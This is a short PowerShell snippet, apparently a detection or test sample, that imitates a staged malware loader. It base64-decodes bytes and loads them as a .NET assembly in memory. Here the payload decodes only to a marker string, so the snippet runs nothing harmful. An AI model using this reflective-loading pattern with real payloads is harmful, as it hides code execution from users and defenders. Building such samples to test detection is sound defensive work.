
<# Staged execution #> $PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpibncwY2thazRm'); $StageResult = [Reflection.Assembly]::Load($PayloadBytes); $StageResult.GetTypes().Count; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
